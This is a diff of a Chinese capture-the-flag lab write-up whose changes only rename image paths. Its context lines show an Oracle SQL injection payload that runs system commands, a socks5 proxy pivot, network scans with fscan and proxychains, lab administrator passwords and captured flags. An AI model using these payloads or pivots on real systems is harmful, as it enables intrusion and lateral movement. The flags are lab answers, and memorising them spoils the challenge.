@@ -1,13 +1,13 @@
 
-![](assets/file-20260529150909917.png)
+![](file-20260604103603397.png)
 # flag01
 ## 登录 39.101.140.137
 可能是SQL注入
-![697](assets/file-20260529151640215.png)
+![697](file-20260604103603399.png)
 
 ## 登录39.101.138.52
 有PbootCMS，PbootCMS 是一款**永久开源免费、可商用**的轻量级 PHP 企业建站系统，由于是PHP搭建的，尝试寻找漏洞
-![](assets/file-20260529151439311.png)
+![](file-20260604103603407.png)
 
 ## nmap扫描
 对两个IP地址进行nmap扫描 ，第二个有PbootCMS
@@ -49,7 +49,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ## 反弹
 https://fushuling.com/index.php/2024/02/10/__trashed/  靶机博客
 https://guokeya.github.io/post/WscncUrcS/  漏洞原理
-![](assets/file-20260529154404715.png)
+![](file-20260604103603410.png)
 
 完整的Request
 
@@ -262,7 +262,7 @@ name=admin' and (select dbms_xmlquery.newcontext('declare PRAGMA AUTONOMOUS_TRAN
 ```bash
 name=admin' union select null,(select execute_command('ipconfig') from dual),null from dual--
 ```
-![](assets/file-20260529165047140.png)
+![](file-20260604103603413.png)
 
 此时，添加一个本地管理员用户 RDP 上去进行操作比较方便。
 ```
@@ -425,10 +425,10 @@ SMB         172.23.4.51     445    iZzvg0io6q1o5hZ  [+] iZzvg0io6q1o5hZ\administ
 
 ### 六、配置proxifier
 #### 1.配置proxies
-![](assets/file-20260601164049264.png)
+![](file-20260604103603465.png)
 
 #### 2.配置rules
-![](assets/file-20260601163206432.png)
+![](file-20260604103603471.png)
 
 
 ### 七、启动远程连接
@@ -438,17 +438,17 @@ administrator
 abc123!@#
 ```
 
-![](assets/file-20260529165531264.png)
+![](file-20260604103603474.png)
 
 #### flag02
-![](assets/file-20260601163120003.png)
+![](file-20260604103603477.png)
 
 ```
 flag{Do_you_kown_oracle_rce?}
 ```
 
 readme.txt
-![](assets/file-20260601164509668.png)
+![](file-20260604103603481.png)
 
 
 
@@ -461,7 +461,7 @@ usera@pentest.me
 Admin3gv83
 ```
 
-![](assets/file-20260601170539508.png)
+![](file-20260604103603484.png)
 
 ```
 flag{not_write_password_in_txt}
@@ -589,7 +589,7 @@ flag{id_rsa_so_useful!}
 这里在kali用代理运行`proxychains4 -q nxc smb 172.24.7.16/24`一直检测不到，
 换种方式直接在172.23.4.12上运行`.\fscan.exe -h 172.24.7.16/24 `
 `172.24.7.16`访问不到原因 https://www.doubao.com/thread/w0a279de411cdee37
-![](assets/file-20260601193742404.png)
+![](file-20260604103603490.png)
 
 ```bash
 172.24.7.43:139 open
@@ -673,10 +673,10 @@ flag{id_rsa_so_useful!}
 admin
 confluence_ichunqiu_2022
 ```
-![](assets/file-20260601222259431.png)
+![](file-20260604103603492.png)
 
 #### 发现名单
-![](assets/file-20260601222726038.png)
+![](file-20260604103603496.png)
 
 
 ## VLAN 2 - 172.24.7.0/24
@@ -687,7 +687,7 @@ confluence_ichunqiu_2022
 .\update.exe -L socks5://0.0.0.0:1080
 ```
 
-![](assets/file-20260603142937825.png)
+![](file-20260604103603500.png)
 
 ### SMB 扫描该网段的 Windows 主机：
 
